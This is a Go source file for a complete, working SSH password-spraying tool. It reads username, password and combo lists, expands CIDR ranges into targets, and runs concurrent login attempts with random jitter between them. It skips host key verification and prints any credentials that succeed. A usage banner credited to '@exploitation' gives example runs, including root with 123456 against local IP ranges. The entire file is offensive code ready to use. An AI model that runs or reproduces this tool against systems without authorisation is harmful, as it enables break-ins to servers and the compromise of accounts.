package main

import (
	"bufio"
	"context"
	"flag"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
	"math/rand"
	"time"

	"github.com/melbahja/goph"
	"golang.org/x/crypto/ssh"
)

type Job struct {
	Host     string
	Username string
	Password string
}

var (
	user         string
	userFile     string
	password     string
	passwordFile string
	target       string
	targetList   string
	keyPath      string
	passphrase   string
	port         int
	threads      int
	timeout      int
	verbose 	   bool
	veryVerbose	 bool
	comboFile    string
	delimiter    string
	jitterMin 	 int
	jitterMax 	 int
)

func init() {
	flag.StringVar(&comboFile, "C", "", "Combo file (username:password)")
	flag.StringVar(&comboFile, "combo-file", "", "Combo file (username:password)")
	flag.StringVar(&delimiter, "d", ":", "Delimiter used in combo file")
	flag.StringVar(&delimiter, "delimiter", ":", "Delimiter used in combo file")
	flag.StringVar(&userFile, "U", "", "Path to file with list of usernames")
	flag.StringVar(&userFile, "userfile", "", "Path to file with list of usernames")
	flag.StringVar(&user, "u", "", "Single SSH username")
	flag.StringVar(&user, "user", "", "Single SSH username")
	flag.StringVar(&passwordFile, "P", "", "Path to file with list of passwords")
	flag.StringVar(&passwordFile, "passfile", "", "Path to file with list of passwords")
	flag.StringVar(&password, "p", "", "Single password")
	flag.StringVar(&password, "password", "", "Single password")
	flag.StringVar(&targetList, "T", "", "Path to file with list of targets (IPs or CIDRs)")
	flag.StringVar(&targetList, "targetfile", "", "Path to file with list of targets (IPs or CIDRs)")
	flag.StringVar(&target, "t", "", "Single IP/hostname")
	flag.StringVar(&target, "target", "", "Single IP/hostname")
	flag.StringVar(&keyPath, "i", "", "Path to private key file")
	flag.StringVar(&keyPath, "key-file", "", "Path to private key file")
	flag.StringVar(&passphrase, "s", "", "Passphrase for private key")
	flag.IntVar(&jitterMin, "jmin", 0, "Minimum jitter between attempts in milliseconds")
	flag.IntVar(&jitterMax, "jmax", 0, "Maximum jitter between attempts in milliseconds")
	flag.IntVar(&port, "port", 22, "SSH port (default 22)")
	flag.IntVar(&threads, "q", 10, "Number of concurrent threads")
	flag.IntVar(&threads, "threads", 10, "Number of concurrent threads")
	flag.IntVar(&timeout, "w", 5, "Timeout per connection in seconds")
	flag.IntVar(&timeout, "wait", 5, "Timeout per connection in seconds")
	flag.BoolVar(&verbose, "v", false, "Verbose output (use -vv for more detail)")
	flag.BoolVar(&veryVerbose, "vv", false, "Very verbose output (includes error reasons)")
	flag.Parse()
}

func main() {

	if len(os.Args) == 1 {
		printUsage()
		os.Exit(0)
	}
	
	targets := resolveInputs(target, targetList)
	if len(targets) == 0 {
		fmt.Println("[!] Missing targets. Use -T/-t")
		os.Exit(1)
	}

	rand.Seed(time.Now().UnixNano())
	jobs := make(chan Job)
	var wg sync.WaitGroup

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go worker(jobs, &wg)
	}

	if comboFile != "" {
		combos, err := parseComboFile(comboFile, delimiter)
		if err != nil {
			fmt.Printf("[!] Failed to read combo file: %v\n", err)
			os.Exit(1)
		}
		for _, host := range expandTargets(targets) {
			for _, combo := range combos {
				jobs <- Job{
					Host:     host,
					Username: combo[0],
					Password: combo[1],
				}
			}
		}
	} else {
		usernames := resolveInputs(user, userFile)
		passwords := resolveInputs(password, passwordFile)
		if len(usernames) == 0 || len(passwords) == 0 {
			fmt.Println("[!] Missing users or passwords.")
			os.Exit(1)
		}
		for _, host := range expandTargets(targets) {
			for _, u := range usernames {
				for _, p := range passwords {
					jobs <- Job{
						Host:     host,
						Username: u,
						Password: p,
					}
				}
			}
		}
	}

	close(jobs)
	wg.Wait()
}

func printUsage() {
	fmt.Println(`
SSH Spray Tool ( by @exploitation)

Required:
  -U, --userfile FILE        File with usernames
  -u, --user USERNAME        Single username
  -P, --passfile FILE        File with passwords
  -p, --password PASSWORD    Single password
  -C, --combo-file FILE      File with user:pass lines
  -d, --delimiter CHAR       Delimiter for combo file (default ":")
  -T, --targetfile FILE      File with IPs/CIDRs
  -t, --target IP            Single IP/hostname
  -i, --key-file FILE        Path to private key
  -s, --passphrase STRING    Passphrase for key file

Optional:
  -q, --threads INT          Number of concurrent threads (default: 10)
  -w, --wait INT             Timeout in seconds (default: 5)
  --jmin INT                 Minimum jitter between attempts (milliseconds)
  --jmax INT                 Maximum jitter between attempts (milliseconds)
  -v                         Verbose (-v, -vv for more)

Examples:
	go run main.go -C combos.txt -T targets.txt -q 10 -v --jmin 250 --jmax 1000
	go run main.go -U users.txt -P passwords.txt -T ips.txt -q 30 -w 3
	go run main.go -u root -p 123456 -t 192.168.1.10
	go run main.go -U users.txt -i ~/.ssh/id_rsa -T 192.168.1.0/28
`)
}

func resolveInputs(single string, file string) []string {
	var list []string
	if single != "" {
		list = append(list, strings.TrimSpace(single))
	}
	if file != "" {
		lines, err := readLines(file)
		if err != nil {
			fmt.Printf("[!] Failed to read file %s: %v\n", file, err)
			os.Exit(1)
		}
		list = append(list, lines...)
	}
	return list
}

func readLines(path string) ([]string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	var lines []string
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		txt := strings.TrimSpace(scanner.Text())
		if txt != "" {
			lines = append(lines, txt)
		}
	}
	return lines, scanner.Err()
}

func expandTargets(input []string) []string {
	var expanded []string
	for _, target := range input {
		if strings.Contains(target, "/") {
			ips := expandCIDR(target)
			expanded = append(expanded, ips...)
		} else {
			expanded = append(expanded, target)
		}
	}
	return expanded
}

func expandCIDR(entry string) []string {
	ip, ipnet, err := net.ParseCIDR(entry)
	if err != nil {
		return []string{}
	}
	var ips []string
	for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); incIP(ip) {
		ips = append(ips, ip.String())
	}
	if len(ips) > 2 {
		return ips[1 : len(ips)-1]
	}
	return ips
}

func incIP(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}

func parseComboFile(path string, delimiter string) ([][2]string, error) {
	lines, err := readLines(path)
	if err != nil {
		return nil, err
	}
	var combos [][2]string
	for _, line := range lines {
		parts := strings.SplitN(line, delimiter, 2)
		if len(parts) == 2 {
			combos = append(combos, [2]string{parts[0], parts[1]})
		}
	}
	return combos, nil
}


func worker(jobs <-chan Job, wg *sync.WaitGroup) {
	defer wg.Done()
	for job := range jobs {

		if jitterMax > 0 && jitterMax > jitterMin {
			delay := time.Duration(rand.Intn(jitterMax-jitterMin)+jitterMin) * time.Millisecond
			time.Sleep(delay)
		}

		ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeout)*time.Second)
		done := make(chan bool, 1)

		go func() {
			defer cancel()

			var auth goph.Auth
			var err error

			if keyPath != "" {
				auth, err = goph.Key(keyPath, passphrase)
				if err != nil {
					if veryVerbose {
						fmt.Printf("[!] Key error for %s: %v\n", job.Host, err)
					}
					done <- true
					return
				}
			} else {
				auth = goph.Password(job.Password)
			}

			client, err := goph.NewConn(&goph.Config{
				User:     job.Username,
				Addr:     job.Host,
				Port:     uint(port),
				Auth:     auth,
				Timeout:  time.Duration(timeout) * time.Second,
				Callback: ssh.InsecureIgnoreHostKey(),
			})

			if err == nil {
				fmt.Printf("[+] SUCCESS: %s:%d (%s:%s)\n", job.Host, port, job.Username, job.Password)
				client.Close()
			} else if veryVerbose {
				fmt.Printf("[-] FAIL: %s (%s:%s) - %v\n", job.Host, job.Username, job.Password, err)
			} else if verbose || veryVerbose {
				fmt.Printf("[-] FAIL: %s (%s:%s)\n", job.Host, job.Username, job.Password)
			}

			done <- true
		}()

		select {
		case <-ctx.Done():
			if verbose || veryVerbose {
				fmt.Printf("[!] TIMEOUT: %s (%s)\n", job.Host, job.Username)
			}
		case <-done:
		}
	}
}
